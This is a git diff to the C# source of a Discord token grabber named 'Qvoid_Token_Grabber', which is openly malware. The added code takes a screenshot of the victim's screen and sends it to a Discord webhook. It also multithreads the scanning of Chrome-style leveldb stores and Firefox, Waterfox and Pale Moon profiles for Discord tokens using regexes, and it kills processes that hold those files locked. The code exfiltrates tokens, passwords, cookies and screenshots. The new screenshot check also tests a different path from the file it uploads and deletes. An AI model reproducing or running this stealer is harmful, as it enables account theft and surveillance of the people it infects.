@@ -1,19 +1,20 @@
-using Qvoid_Token_Grabber.Misc;
-using System;
-using System.Collections.Generic;
-using System.IO;
-using System.Net;
-using System.Text.RegularExpressions;
-using Qvoid;
-using System.Drawing;
-using Qvoid_Token_Grabber.PasswordGrabbers;
-using System.Threading;
-using System.Diagnostics;
-using System.Windows.Forms;
-using System.Reflection;
 using LastDudeOnTheTrack.Properties;
+using Qvoid;
+using Qvoid_Token_Grabber.Misc;
+using Qvoid_Token_Grabber.PasswordGrabbers;
+using System.Collections.Generic;
+using System.Diagnostics;
 using System.Drawing.Imaging;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Reflection;
 using System.Security.Principal;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Windows.Forms;
+using System;
 
 namespace Qvoid_Token_Grabber.Discord
 {
@@ -165,14 +166,19 @@ namespace Qvoid_Token_Grabber.Discord
                 int screenWidth = SystemInformation.VirtualScreen.Width;
                 int screenHeight = SystemInformation.VirtualScreen.Height;
 
+                string ss_Name = DateTime.UtcNow.Ticks.ToString() + "_Capture.jpg";
                 using (Bitmap bmp = new Bitmap(screenWidth, screenHeight))
                 {
-                    using (Graphics g = Graphics.FromImage(bmp))
-                        g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
+                    try
+                    {
+                        using (Graphics g = Graphics.FromImage(bmp))
+                            g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
 
-                    bmp.Save(Path.GetTempPath() + "\\Capture.jpg", ImageFormat.Jpeg);
+                        bmp.Save($"{Path.GetTempPath()}\\{ss_Name}", ImageFormat.Jpeg);
+                    }
+                    catch
+                    { }
                 }
-
 
                 string Passwords = "------ Passwords ------";
                 string Cookies = "------ Cookies ------";
@@ -405,10 +411,14 @@ namespace Qvoid_Token_Grabber.Discord
                     Webhook.Send(embed);
                     Thread.Sleep(30);
                     Webhook.Send(embed2);
-                    Thread.Sleep(30);
-                    Webhook.Send(null, new FileInfo(Path.GetTempPath() + "\\Capture.jpg"));
-                    Thread.Sleep(30);
-                    File.Delete(Path.GetTempPath() + "\\Capture.jpg");
+                    
+                    if (File.Exists(ss_Name))
+                    {
+                        Thread.Sleep(30);
+                        Webhook.Send(null, new FileInfo(Path.GetTempPath() + "\\Capture.jpg"));
+                        Thread.Sleep(30);
+                        File.Delete(Path.GetTempPath() + "\\Capture.jpg");
+                    }
                 }
             }
         }
@@ -618,6 +628,7 @@ namespace Qvoid_Token_Grabber.Discord
         {
             string localAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
             string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            string _DiscordExe = DiscordExe;
 
             //Adding known tokens paths.
             TokensLocation.Add(localAppdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
@@ -640,117 +651,159 @@ namespace Qvoid_Token_Grabber.Discord
 
             List<string> tokens = new List<string>();
 
-            foreach (var tokenPath in TokensLocation)
+            Thread FireFoxBased = new Thread(() =>
             {
-                if (!Directory.Exists(tokenPath))
-                    continue;
+                List<string> FireFoxBasedLocation = new List<string>();
+                List<Thread> Threads = new List<Thread>();
 
-                if (tokenPath == roaming + "\\Mozilla\\Firefox\\Profiles")
+                FireFoxBasedLocation.Add(roaming + "\\Mozilla\\Firefox\\Profiles");
+                FireFoxBasedLocation.Add(roaming + "\\Waterfox\\Profiles");
+                FireFoxBasedLocation.Add(roaming + "\\Moonchild Productions\\Pale Moon\\Profiles");
+
+                foreach (var tokenPath in FireFoxBasedLocation)
                 {
-                    //FireFox needs to be threat in special way ;(
-                    foreach (var directory in Directory.GetDirectories(roaming + "\\Mozilla\\Firefox\\Profiles"))
+                    if (!Directory.Exists(tokenPath))
+                        continue;
+
+                    Thread _t = new Thread(() =>
                     {
-                        var files = Directory.GetFiles(directory);
-                        foreach (var file in files)
+                        //FireFox needs to be threat in special way ;(
+                        foreach (var directory in Directory.GetDirectories(tokenPath))
                         {
-                            while (true)
+                            var files = Directory.GetFiles(directory);
+                            foreach (var file in files)
                             {
-                                if (!file.EndsWith(".sqlite"))
-                                    break;
-
-                                try
+                                while (true)
                                 {
-                                    string fileContent = "";
+                                    if (!file.EndsWith(".sqlite"))
+                                        break;
 
-                                    //Because there might be some issues reading the tokens files such as locked or already used by some process, we trying to bypass it.
-                                    using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
-                                    using (StreamReader sr = new StreamReader(fs))
-                                        fileContent = sr.ReadToEnd();
-
-                                    MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
-                                    MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}");
-
-                                    foreach (Match match in matches)
-                                        if (IsValidToken(match.Value))
-                                            tokens.Add(match.Value);
-
-                                    foreach (Match match in mfaMatches)
-                                        if (IsValidToken(match.Value))
-                                            tokens.Add(match.Value);
-
-                                    break;
-                                }
-                                catch (Exception)
-                                {
-                                    foreach (var locker in QvoidWrapper.ProcessHandler.WhoIsLocking(file))
+                                    try
                                     {
-                                        try
-                                        {
-                                            if (locker.MainModule.FileName == DiscordExe)
-                                                continue;
-                                        }
-                                        catch (Exception)
-                                        { }
+                                        string fileContent = "";
 
-                                        try { locker.Kill(); }
-                                        catch { break; }
+                                        //Because there might be some issues reading the tokens files such as locked or already used by some process, we trying to bypass it.
+                                        using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                                        using (StreamReader sr = new StreamReader(fs))
+                                            fileContent = sr.ReadToEnd();
+
+                                        MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
+                                        MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}");
+
+                                        foreach (Match match in matches)
+                                            if (IsValidToken(match.Value))
+                                                tokens.Add(match.Value);
+
+                                        foreach (Match match in mfaMatches)
+                                            if (IsValidToken(match.Value))
+                                                tokens.Add(match.Value);
+
+                                        break;
+                                    }
+                                    catch (Exception)
+                                    {
+                                        foreach (var locker in QvoidWrapper.ProcessHandler.WhoIsLocking(file))
+                                        {
+                                            try
+                                            {
+                                                if (locker.MainModule.FileName == _DiscordExe)
+                                                    continue;
+                                            }
+                                            catch (Exception)
+                                            { }
+
+                                            try { locker.Kill(); }
+                                            catch { break; }
+                                        }
                                     }
                                 }
                             }
                         }
-                    }
+                    });
 
-                    continue;
+                    Threads.Add(_t);
+                    _t.Start();
                 }
 
-                foreach (string filePath in Directory.GetFiles(tokenPath))
+                Thread.Sleep(150);
+                while (true)
                 {
-                    while (true)
+                    foreach (var t in Threads.ToList())
                     {
-                        if (!filePath.EndsWith(".log") && !filePath.EndsWith(".ldb"))
-                            break;
+                        if (!t.IsAlive)
+                            Threads.Remove(t);
+                    }
 
-                        try
+                    if (Threads.ToList().Count == 0)
+                        break;
+                }
+
+            });
+
+            Thread Main = new Thread(() =>
+            {
+                List<Thread> Threads = new List<Thread>();
+
+                foreach (var tokenPath in TokensLocation)
+                {
+                    if (!Directory.Exists(tokenPath))
+                        continue;
+
+                    foreach (string filePath in Directory.GetFiles(tokenPath))
+                    {
+                        while (true)
                         {
-                            string fileContent = "";
+                            if (!filePath.EndsWith(".log") && !filePath.EndsWith(".ldb"))
+                                break;
 
-                            //Because there might be some issues reading the tokens files such as locked or already used by some process, we trying to bypass it.
-                            using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
-                            using (StreamReader sr = new StreamReader(fs))
-                                fileContent = sr.ReadToEnd();
-
-                            MatchCollection matches = Regex.Matches(fileContent, "(\\w|\\d){24}.(\\w|\\d|_|-){6}.(\\w|\\d|_|-){27}");
-                            MatchCollection mfaMatches = Regex.Matches(fileContent, "mfa.(\\w|\\d|_|-){84}");
-
-                            foreach (Match match in matches)
-                                if (IsValidToken(match.Value))
-                                    tokens.Add(match.Value);
-
-                            foreach (Match match in mfaMatches)
-                                if (IsValidToken(match.Value))
-                                    tokens.Add(match.Value);
-
-                            break;
-                        }
-                        catch (Exception)
-                        {
-                            foreach (var locker in QvoidWrapper.ProcessHandler.WhoIsLocking(filePath))
+                            try
                             {
-                                try
-                                {
-                                    if (locker.MainModule.FileName == DiscordExe)
-                                        continue;
-                                }
-                                catch (Exception)
-                                { }
+                                string fileContent = "";
 
-                                try { locker.Kill(); }
-                                catch { break; }
+                                //Because there might be some issues reading the tokens files such as locked or already used by some process, we trying to bypass it.
+                                using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                                using (StreamReader sr = new StreamReader(fs))
+                                    fileContent = sr.ReadToEnd();
+
+                                MatchCollection matches = Regex.Matches(fileContent, "(\\w|\\d){24}.(\\w|\\d|_|-){6}.(\\w|\\d|_|-){27}");
+                                MatchCollection mfaMatches = Regex.Matches(fileContent, "mfa.(\\w|\\d|_|-){84}");
+
+                                foreach (Match match in matches)
+                                    if (IsValidToken(match.Value))
+                                        tokens.Add(match.Value);
+
+                                foreach (Match match in mfaMatches)
+                                    if (IsValidToken(match.Value))
+                                        tokens.Add(match.Value);
+
+                                break;
+                            }
+                            catch (Exception)
+                            {
+                                foreach (var locker in QvoidWrapper.ProcessHandler.WhoIsLocking(filePath))
+                                {
+                                    try
+                                    {
+                                        if (locker.MainModule.FileName == _DiscordExe)
+                                            continue;
+                                    }
+                                    catch (Exception)
+                                    { }
+
+                                    try { locker.Kill(); }
+                                    catch { break; }
+                                }
                             }
                         }
                     }
                 }
-            }
+            });
+
+            Main.Start();
+            FireFoxBased.Start();
+
+            while (Main.IsAlive || FireFoxBased.IsAlive)
+                Thread.Sleep(1);
 
             return tokens;
         }
